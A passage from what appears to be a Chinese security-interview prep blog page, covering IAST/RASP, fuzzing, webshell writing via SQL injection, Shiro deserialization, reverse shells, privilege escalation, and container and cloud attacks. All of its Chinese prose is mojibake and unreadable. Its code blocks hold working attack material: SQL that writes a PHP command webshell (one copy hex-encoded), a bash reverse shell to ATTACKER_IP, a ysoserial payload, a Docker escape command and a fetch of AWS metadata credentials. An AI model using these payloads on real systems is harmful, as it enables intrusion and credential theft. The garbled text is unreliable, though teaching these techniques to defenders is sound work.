è·¯å¾„ï¼Œæé«˜æ¼æ´çš„æ£€å‡ºç‡ï¼Œä½†å¯èƒ½ä¼šå¯¹åº”ç”¨ç¨‹åºçš„æ€§èƒ½äº§ç”Ÿä¸€å®šå½±å“ï¼Œä¸”éœ€è¦ä¸€å®šçš„æµ‹è¯•ç¯å¢ƒå’Œèµ„æºæ”¯æŒã€‚</li><li><strong>è¢«åŠ¨å¼</strong>ï¼šè¢«åŠ¨å¼IASTä¸»è¦æ˜¯é€šè¿‡ç›‘æµ‹åº”ç”¨ç¨‹åºçš„æ­£å¸¸è¿è¡Œæµé‡å’Œè¡Œä¸ºï¼Œåˆ†æå…¶ä¸­æ˜¯å¦å­˜åœ¨å¼‚å¸¸æˆ–æ½œåœ¨çš„æ¼æ´åˆ©ç”¨è¡Œä¸ºã€‚å®ƒå¯¹åº”ç”¨ç¨‹åºçš„æ€§èƒ½å½±å“è¾ƒå°ï¼Œä½†æ£€æµ‹èŒƒå›´å’Œç²¾åº¦å¯èƒ½ä¸å¦‚ä¸»åŠ¨å¼IASTï¼Œå¯èƒ½ä¼šå­˜åœ¨ä¸€å®šçš„æ¼æŠ¥æƒ…å†µã€‚</li></ul></li></ul><h3 id="IASTå’ŒRASPæ˜¯å¦ä¼šäº§ç”Ÿè„æ•°æ®"><a href="#IASTå’ŒRASPæ˜¯å¦ä¼šäº§ç”Ÿè„æ•°æ®" class="headerlink" title="IASTå’ŒRASPæ˜¯å¦ä¼šäº§ç”Ÿè„æ•°æ®"></a>IASTå’ŒRASPæ˜¯å¦ä¼šäº§ç”Ÿè„æ•°æ®</h3><ul><li><strong>IAST</strong>ï¼šåœ¨æµ‹è¯•é˜¶æ®µè¿è¡Œï¼Œä¸»è¦å…³æ³¨äºæ¼æ´çš„æ£€æµ‹å’Œå‘ç°ï¼Œä¸ä¼šå¯¹åº”ç”¨ç¨‹åºçš„æ­£å¸¸æ•°æ®å’Œä¸šåŠ¡é€»è¾‘äº§ç”Ÿå½±å“ï¼Œå› æ­¤ä¸€èˆ¬ä¸ä¼šäº§ç”Ÿè„æ•°æ®ã€‚</li><li><strong>RASP</strong>ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œï¼Œä¼šå¯¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºè¿›è¡Œç›‘æ§å’Œå¹²é¢„ï¼Œå¯èƒ½ä¼šå¯¹ä¸€äº›æ­£å¸¸çš„ä¸šåŠ¡æ“ä½œäº§ç”Ÿè¯¯åˆ¤ï¼Œå¯¼è‡´é˜»æ–­æˆ–ä¿®æ”¹æ­£å¸¸çš„è¯·æ±‚å’Œæ•°æ®ï¼Œä»è€Œäº§ç”Ÿè„æ•°æ®ã€‚ä½†ä¼˜ç§€çš„RASPäº§å“ä¼šé€šè¿‡ç²¾ç¡®çš„æ£€æµ‹ç®—æ³•å’Œç­–ç•¥ï¼Œå°½é‡å‡å°‘è¯¯åˆ¤å’Œè„æ•°æ®çš„äº§ç”Ÿã€‚</li></ul><h3 id="ç¬¦å·æ‰§è¡ŒåŠçº¦æŸæ±‚è§£"><a href="#ç¬¦å·æ‰§è¡ŒåŠçº¦æŸæ±‚è§£" class="headerlink" title="ç¬¦å·æ‰§è¡ŒåŠçº¦æŸæ±‚è§£"></a>ç¬¦å·æ‰§è¡ŒåŠçº¦æŸæ±‚è§£</h3><ul><li><strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼šæ˜¯ä¸€ç§ç¨‹åºåˆ†ææŠ€æœ¯ï¼Œå®ƒå°†ç¨‹åºçš„è¾“å…¥è¡¨ç¤ºä¸ºç¬¦å·è€Œä¸æ˜¯å…·ä½“çš„å€¼ï¼Œç„¶åé€šè¿‡ç¬¦å·æ‰§è¡Œå¼•æ“å¯¹ç¨‹åºè¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œï¼Œè·Ÿè¸ªç¨‹åºçš„æ‰§è¡Œè·¯å¾„å’ŒçŠ¶æ€å˜åŒ–ï¼Œä»¥å‘ç°æ½œåœ¨çš„æ¼æ´å’Œé”™è¯¯ã€‚åœ¨ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šæ ¹æ®ç¨‹åºçš„é€»è¾‘å’Œçº¦æŸæ¡ä»¶ï¼Œå»ºç«‹ç¬¦å·çº¦æŸè¡¨è¾¾å¼ï¼Œå½“éœ€è¦ç¡®å®šæŸä¸ªè·¯å¾„æ˜¯å¦å¯è¾¾æˆ–æŸä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹æ—¶ï¼Œå°±éœ€è¦è¿›è¡Œçº¦æŸæ±‚è§£ã€‚</li><li><strong>çº¦æŸæ±‚è§£</strong>ï¼šçº¦æŸæ±‚è§£å™¨ä¼šæ ¹æ®ç¬¦å·çº¦æŸè¡¨è¾¾å¼ï¼Œå¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„è¾“å…¥å€¼æˆ–è¯æ˜æ— è§£ã€‚ä¾‹å¦‚ï¼Œåœ¨åˆ†æä¸€ä¸ªå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„ç¨‹åºæ—¶ï¼Œç¬¦å·æ‰§è¡Œå¼•æ“ä¼šè·Ÿè¸ªè¾“å…¥æ•°æ®åœ¨ç¼“å†²åŒºä¸­çš„å†™å…¥æ“ä½œï¼Œå»ºç«‹å…³äºè¾“å…¥é•¿åº¦å’Œç¼“å†²åŒºå¤§å°çš„çº¦æŸè¡¨è¾¾å¼ï¼Œçº¦æŸæ±‚è§£å™¨ä¼šå°è¯•æ‰¾åˆ°ä½¿è¾“å…¥é•¿åº¦è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„è¾“å…¥å€¼ï¼Œä»è€Œç¡®å®šæ¼æ´çš„å­˜åœ¨ã€‚</li></ul><h3 id="å¯ç”¨Fuzzæ£€æµ‹çš„æ¼æ´ç±»å‹"><a href="#å¯ç”¨Fuzzæ£€æµ‹çš„æ¼æ´ç±»å‹" class="headerlink" title="å¯ç”¨Fuzzæ£€æµ‹çš„æ¼æ´ç±»å‹"></a>å¯ç”¨Fuzzæ£€æµ‹çš„æ¼æ´ç±»å‹</h3><ul><li><strong>ç¼“å†²åŒºæº¢å‡ºæ¼æ´</strong>ï¼šé€šè¿‡å‘ç¨‹åºè¾“å…¥å¤§é‡æ•°æ®ï¼Œä½¿å…¶è¶…è¿‡ç¼“å†²åŒºçš„å®¹é‡ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚Fuzzæµ‹è¯•å¯ä»¥ç”Ÿæˆå„ç§é•¿åº¦å’Œå†…å®¹çš„è¾“å…¥æ•°æ®ï¼Œæ¨¡æ‹Ÿè¿™ç§æº¢å‡ºæƒ…å†µï¼Œæ£€æµ‹ç¨‹åºæ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚</li><li><strong>SQLæ³¨å…¥æ¼æ´</strong>ï¼šé€šè¿‡å‘ç¨‹åºè¾“å…¥æ¶æ„çš„SQLè¯­å¥ï¼Œå¹²æ‰°æ•°æ®åº“çš„æ­£å¸¸è¿è¡Œã€‚Fuzzæµ‹è¯•å¯ä»¥ç”Ÿæˆå„ç§åŒ…å«ç‰¹æ®Šå­—ç¬¦ã€SQLå…³é”®å­—ç­‰çš„è¾“å…¥ï¼Œå°è¯•æ³¨å…¥åˆ°ç¨‹åºçš„æŸ¥è¯¢è¯­å¥ä¸­ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</li><li><strong>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰æ¼æ´</strong>ï¼šé€šè¿‡å‘ç½‘é¡µè¾“å…¥æ¶æ„çš„è„šæœ¬ä»£ç ï¼Œä½¿å…¶åœ¨å…¶ä»–ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚Fuzzæµ‹è¯•å¯ä»¥ç”Ÿæˆå„ç§åŒ…å«HTMLæ ‡ç­¾ã€è„šæœ¬ä»£ç ç­‰çš„è¾“å…¥ï¼Œæ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥åˆ°ç½‘é¡µè¡¨å•æˆ–URLå‚æ•°ä¸­ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨XSSæ¼æ´ã€‚</li><li><strong>å‘½ä»¤æ³¨å…¥æ¼æ´</strong>ï¼šé€šè¿‡å‘ç¨‹åºè¾“å…¥æ¶æ„çš„å‘½ä»¤ï¼Œä½¿å…¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚Fuzzæµ‹è¯•å¯ä»¥ç”Ÿæˆå„ç§åŒ…å«æ“ä½œç³»ç»Ÿå‘½ä»¤ã€ç‰¹æ®Šå­—ç¬¦ç­‰çš„è¾“å…¥ï¼Œå°è¯•æ³¨å…¥åˆ°ç¨‹åºçš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</li><li><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ï¼šé€šè¿‡å‘ç¨‹åºè¾“å…¥æ¶æ„çš„æ–‡ä»¶è·¯å¾„ï¼Œä½¿å…¶åŒ…å«å¹¶æ‰§è¡ŒæŒ‡å®šçš„æ–‡ä»¶ã€‚Fuzzæµ‹è¯•å¯ä»¥ç”Ÿæˆå„ç§åŒ…å«ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ã€ç½‘ç»œè·¯å¾„ç­‰çš„è¾“å…¥ï¼Œå°è¯•åŒ…å«åˆ°ç¨‹åºçš„æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</li></ul><h2 id="æºç¨‹"><a href="#æºç¨‹" class="headerlink" title="æºç¨‹"></a>æºç¨‹</h2><p>ä»¥ä¸‹æ˜¯å¯¹è¿™äº›é—®é¢˜çš„è¯¦ç»†è§£ç­”ï¼ŒåŒ…å«æŠ€æœ¯ç»†èŠ‚å’Œä»£ç ç¤ºä¾‹ï¼š</p><hr><h3 id="1-SQL-æ³¨å…¥å†™é©¬"><a href="#1-SQL-æ³¨å…¥å†™é©¬" class="headerlink" title="1. SQL æ³¨å…¥å†™é©¬"></a><strong>1. SQL æ³¨å…¥å†™é©¬</strong></h3><h4 id="outfile-å’Œ-dumpfile-çš„åŒºåˆ«"><a href="#outfile-å’Œ-dumpfile-çš„åŒºåˆ«" class="headerlink" title="outfile å’Œ dumpfile çš„åŒºåˆ«"></a><strong><code>outfile</code> å’Œ <code>dumpfile</code> çš„åŒºåˆ«</strong></h4><ul><li>**<code>outfile</code>**ï¼šæ”¯æŒå¤šè¡Œå†™å…¥ï¼Œå¯ä»¥è‡ªå®šä¹‰ç¼–ç ï¼ˆå¦‚ Base64ï¼‰ï¼Œä½†éœ€è¦ç›®æ ‡æœåŠ¡å™¨æœ‰å†™æƒé™ã€‚</li><li>**<code>dumpfile</code>**ï¼šåªèƒ½å†™å•è¡Œæ•°æ®ï¼Œä¸”ä¸æ”¯æŒç¼–ç ï¼Œä½†å¯ä»¥ç»•è¿‡æŸäº› WAFã€‚</li></ul><h4 id="ç¤ºä¾‹ï¼šåˆ©ç”¨-outfile-å†™-Webshell"><a href="#ç¤ºä¾‹ï¼šåˆ©ç”¨-outfile-å†™-Webshell" class="headerlink" title="ç¤ºä¾‹ï¼šåˆ©ç”¨ outfile å†™ Webshell"></a><strong>ç¤ºä¾‹ï¼šåˆ©ç”¨ <code>outfile</code> å†™ Webshell</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="ç¤ºä¾‹ï¼šåˆ©ç”¨-dumpfile-å†™å•è¡Œ"><a href="#ç¤ºä¾‹ï¼šåˆ©ç”¨-dumpfile-å†™å•è¡Œ" class="headerlink" title="ç¤ºä¾‹ï¼šåˆ©ç”¨ dumpfile å†™å•è¡Œ"></a><strong>ç¤ºä¾‹ï¼šåˆ©ç”¨ <code>dumpfile</code> å†™å•è¡Œ</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E</span> </span><br><span class="line"><span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><hr><h3 id="2-å®½å­—ç¬¦æˆªæ–­çš„åŸç†"><a href="#2-å®½å­—ç¬¦æˆªæ–­çš„åŸç†" class="headerlink" title="2. å®½å­—ç¬¦æˆªæ–­çš„åŸç†"></a><strong>2. å®½å­—ç¬¦æˆªæ–­çš„åŸç†</strong></h3><h4 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h4><p>å®½å­—ç¬¦æˆªæ–­åˆ©ç”¨å­—ç¬¦ç¼–ç å·®å¼‚ï¼ˆå¦‚ UTF-8 å’Œ GBKï¼‰ï¼Œé€šè¿‡æˆªæ–­å­—ç¬¦ç»•è¿‡å•å¼•å·é™åˆ¶ã€‚</p><h4 id="ç¤ºä¾‹-5"><a href="#ç¤ºä¾‹-5" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; /*!UNION*/ SELECT 1, 2, 3, 0x61646d696e FROM users--</span></span><br></pre></td></tr></table></figure><ul><li><code>0x61646d696e</code> æ˜¯ <code>admin</code> çš„åå…­è¿›åˆ¶ç¼–ç ã€‚</li><li>é€šè¿‡å®½å­—ç¬¦æˆªæ–­ç»•è¿‡å•å¼•å·é™åˆ¶ã€‚</li></ul><hr><h3 id="3-SSRF-æ— å›æ˜¾çš„åˆ©ç”¨"><a href="#3-SSRF-æ— å›æ˜¾çš„åˆ©ç”¨" class="headerlink" title="3. SSRF æ— å›æ˜¾çš„åˆ©ç”¨"></a><strong>3. SSRF æ— å›æ˜¾çš„åˆ©ç”¨</strong></h3><h4 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h4><p>æ— å›æ˜¾æ—¶ï¼Œé€šè¿‡ç›²æ³¨åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸï¼ˆå¦‚ HTTP çŠ¶æ€ç æˆ–å“åº”æ—¶é—´ï¼‰ã€‚</p><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a><strong>å·¥å…·</strong></h4><ul><li><strong>Burp Suite</strong>ï¼šæ„é€ è¯·æ±‚ï¼Œç›‘æ§å“åº”ã€‚</li><li><strong>Nuclei</strong>ï¼šè‡ªåŠ¨åŒ–æ‰«æ SSRF æ¼æ´ã€‚</li></ul><h4 id="ç¤ºä¾‹-6"><a href="#ç¤ºä¾‹-6" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/api?target=http://internal-service&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Service Unavailable&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SSRF åˆ©ç”¨æˆåŠŸ&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h3 id="4-Shiro-æ¼æ´"><a href="#4-Shiro-æ¼æ´" class="headerlink" title="4. Shiro æ¼æ´"></a><strong>4. Shiro æ¼æ´</strong></h3><h4 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h4><p>Apache Shiro å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼ˆå¦‚ <code>rememberMe</code> Cookieï¼‰ï¼Œå¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h4 id="åˆ©ç”¨-3"><a href="#åˆ©ç”¨-3" class="headerlink" title="åˆ©ç”¨"></a><strong>åˆ©ç”¨</strong></h4><ul><li><strong>å·¥å…·</strong>ï¼š<code>ysoserial</code> ç”Ÿæˆ payloadã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;calc&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure>å°† <code>payload.ser</code> ç¼–ç ä¸º Base64ï¼Œæ³¨å…¥åˆ° <code>rememberMe</code> Cookie ä¸­ã€‚</li></ul><h4 id="å¤±è´¥åŸå› "><a href="#å¤±è´¥åŸå› " class="headerlink" title="å¤±è´¥åŸå› "></a><strong>å¤±è´¥åŸå› </strong></h4><ol><li>Shiro ç‰ˆæœ¬ä¸å—å½±å“ã€‚</li><li>æœªå¯ç”¨ <code>rememberMe</code> åŠŸèƒ½ã€‚</li><li>ç¯å¢ƒç¼ºå°‘ä¾èµ–ï¼ˆå¦‚ <code>commons-collections</code>ï¼‰ã€‚</li></ol><hr><h3 id="5-åå¼¹-Shell-çš„æœ¬è´¨"><a href="#5-åå¼¹-Shell-çš„æœ¬è´¨" class="headerlink" title="5. åå¼¹ Shell çš„æœ¬è´¨"></a><strong>5. åå¼¹ Shell çš„æœ¬è´¨</strong></h3><p>åå¼¹ Shell æ˜¯é€šè¿‡å»ºç«‹åå‘è¿æ¥ï¼Œå°†ç›®æ ‡æœºå™¨çš„æ§åˆ¶æƒè½¬ç§»åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚</p><h4 id="ç¤ºä¾‹-7"><a href="#ç¤ºä¾‹-7" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»è€…ç›‘å¬</span></span><br><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœºå™¨æ‰§è¡Œ</span></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="6-ä½œä¸º-Agent-é‡‡é›†ä¿¡æ¯"><a href="#6-ä½œä¸º-Agent-é‡‡é›†ä¿¡æ¯" class="headerlink" title="6. ä½œä¸º Agent é‡‡é›†ä¿¡æ¯"></a><strong>6. ä½œä¸º Agent é‡‡é›†ä¿¡æ¯</strong></h3><h4 id="éœ€è¦é‡‡é›†çš„ä¿¡æ¯"><a href="#éœ€è¦é‡‡é›†çš„ä¿¡æ¯" class="headerlink" title="éœ€è¦é‡‡é›†çš„ä¿¡æ¯"></a><strong>éœ€è¦é‡‡é›†çš„ä¿¡æ¯</strong></h4><ul><li>ç³»ç»Ÿä¿¡æ¯ï¼šOS ç‰ˆæœ¬ã€å†…æ ¸ç‰ˆæœ¬ã€‚</li><li>ç½‘ç»œä¿¡æ¯ï¼šIPã€ç«¯å£ã€è·¯ç”±è¡¨ã€‚</li><li>è¿›ç¨‹ä¿¡æ¯ï¼šPIDã€PPIDã€å‘½ä»¤è¡Œå‚æ•°ã€‚</li></ul><h4 id="æ„å»ºè¿›ç¨‹æ ‘"><a href="#æ„å»ºè¿›ç¨‹æ ‘" class="headerlink" title="æ„å»ºè¿›ç¨‹æ ‘"></a><strong>æ„å»ºè¿›ç¨‹æ ‘</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_process_tree</span>(<span class="params">pid</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = psutil.Process(pid)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;pid&quot;</span>: p.pid,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: p.name(),</span><br><span class="line">            <span class="string">&quot;cmdline&quot;</span>: p.cmdline(),</span><br><span class="line">            <span class="string">&quot;children&quot;</span>: [build_process_tree(child.pid) <span class="keyword">for</span> child <span class="keyword">in</span> p.children(recursive=<span class="literal">False</span>)]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-ææƒæ£€æµ‹"><a href="#7-ææƒæ£€æµ‹" class="headerlink" title="7. ææƒæ£€æµ‹"></a><strong>7. ææƒæ£€æµ‹</strong></h3><h4 id="Linux-ææƒæ£€æµ‹"><a href="#Linux-ææƒæ£€æµ‹" class="headerlink" title="Linux ææƒæ£€æµ‹"></a><strong>Linux ææƒæ£€æµ‹</strong></h4><ol><li>æ£€æŸ¥ SUID&#x2F;SGID æ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li><li>æ£€æŸ¥å†…æ ¸æ¼æ´ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure></li></ol><h4 id="Windows-ææƒæ£€æµ‹"><a href="#Windows-ææƒæ£€æµ‹" class="headerlink" title="Windows ææƒæ£€æµ‹"></a><strong>Windows ææƒæ£€æµ‹</strong></h4><ol><li>æ£€æŸ¥æƒé™ï¼š<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure></li><li>æ£€æŸ¥æœåŠ¡æƒé™ï¼š<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.StartName <span class="operator">-eq</span> <span class="string">&quot;LocalSystem&quot;</span> &#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="8-äº‘åŸç”Ÿä¸å®¹å™¨å®‰å…¨"><a href="#8-äº‘åŸç”Ÿä¸å®¹å™¨å®‰å…¨" class="headerlink" title="8. äº‘åŸç”Ÿä¸å®¹å™¨å®‰å…¨"></a><strong>8. äº‘åŸç”Ÿä¸å®¹å™¨å®‰å…¨</strong></h3><h4 id="Docker-é€ƒé€¸"><a href="#Docker-é€ƒé€¸" class="headerlink" title="Docker é€ƒé€¸"></a><strong>Docker é€ƒé€¸</strong></h4><ol><li><strong>åˆ©ç”¨å…±äº«å‘½åç©ºé—´</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> --pid=host alpine <span class="built_in">chroot</span> /proc/1/ns/mnt /bin/sh</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨è„ç‰›æ¼æ´</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> --cap-add SYS_ADMIN alpine</span><br></pre></td></tr></table></figure></li></ol><h4 id="Kubernetes-é€ƒé€¸"><a href="#Kubernetes-é€ƒé€¸" class="headerlink" title="Kubernetes é€ƒé€¸"></a><strong>Kubernetes é€ƒé€¸</strong></h4><ul><li>åˆ©ç”¨ <code>kubectl</code> æƒé™æå‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --all-namespaces</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="9-äº‘æœåŠ¡æ”»é˜²"><a href="#9-äº‘æœåŠ¡æ”»é˜²" class="headerlink" title="9. äº‘æœåŠ¡æ”»é˜²"></a><strong>9. äº‘æœåŠ¡æ”»é˜²</strong></h3><h4 id="å¸¸è§æ¼æ´"><a href="#å¸¸è§æ¼æ´" class="headerlink" title="å¸¸è§æ¼æ´"></a><strong>å¸¸è§æ¼æ´</strong></h4><ol><li><strong>æœªæˆæƒè®¿é—®</strong>ï¼šç›´æ¥è®¿é—® S3 Bucketã€‚</li><li><strong>æƒé™æå‡</strong>ï¼šåˆ©ç”¨ IAM è§’è‰²æƒé™è¿‡å¤§ã€‚</li><li><strong>SSRF åˆ©ç”¨å†…éƒ¨æœåŠ¡</strong>ï¼šå¦‚ AWS Metadata Serviceã€‚</li></ol><h4 id="ç¤ºä¾‹-8"><a href="#ç¤ºä¾‹-8" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ AWS Metadata Service è·å–ä¸´æ—¶å‡­è¯</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h2 id="vivo"><a href="#vivo" class="headerlink" title="vivo"></a>vivo</h2><h3 id="1-åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–ä¸€ä¸ªç‚¹çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼ï¼Ÿ"><a href="#1-åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–ä¸€ä¸ªç‚¹çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼ï¼Ÿ" class="headerlink" title="1. åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–ä¸€ä¸ªç‚¹çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼ï¼Ÿ"></a>1. åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–ä¸€ä¸ªç‚¹çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼ï¼Ÿ</h3><ul><li><strong>åˆ©ç”¨æ–‡ä»¶è¯»å–ç‚¹æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯</strong>ï¼šå¯ä»¥å°è¯•è¯»å–å¸¸è§çš„æ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚<code>/etc/passwd</code>ã€<code>/etc/shadow</code>ã€<code>/etc/hosts</code>ã€<code>/etc/ssh/ssh_config</code>ç­‰ï¼Œè·å–ç³»ç»Ÿé…ç½®ä¿¡æ¯ã€‚</li><li><strong>æŸ¥æ‰¾è¿è¡Œä¸­çš„æœåŠ¡</strong>ï¼šé€šè¿‡è¯»å–<code>/proc/[pid]/cmdline</code>æ–‡ä»¶ï¼Œå¯ä»¥è·å–è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œå‚æ•°ï¼Œä»è€Œäº†è§£ç³»ç»Ÿä¸­è¿è¡Œçš„æœåŠ¡ã€‚</li><li><strong>æŸ¥æ‰¾é…ç½®æ–‡ä»¶</strong>ï¼šåˆ©ç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾ç‰¹å®šçš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚<code>find / -name &quot;*.conf&quot;</code>ï¼Œå®šä½åˆ°WebæœåŠ¡å™¨ã€æ•°æ®åº“ç­‰çš„é…ç½®æ–‡ä»¶ã€‚</li></ul><h3 id="2-æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ-proc-pid-cmdlineï¼‰ï¼Ÿ"><a href="#2-æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ-proc-pid-cmdlineï¼‰ï¼Ÿ" class="headerlink" title="2. 